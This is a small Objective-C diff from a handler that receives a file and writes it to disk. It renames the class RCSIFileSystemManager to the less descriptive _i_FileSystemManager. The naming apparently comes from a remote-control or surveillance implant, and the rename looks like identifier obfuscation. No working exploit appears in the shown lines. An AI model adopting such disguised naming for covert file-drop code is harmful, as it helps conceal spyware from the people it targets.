@@ -380,7 +380,7 @@
 #ifdef DEBUG_UP_NOP
           infoLog(@"Received standard file");
 #endif
-          RCSIFileSystemManager *fsManager = [[RCSIFileSystemManager alloc] init];
+          _i_FileSystemManager *fsManager = [[_i_FileSystemManager alloc] init];
           
           [fsManager createFile: filename
                        withData: fileContent];
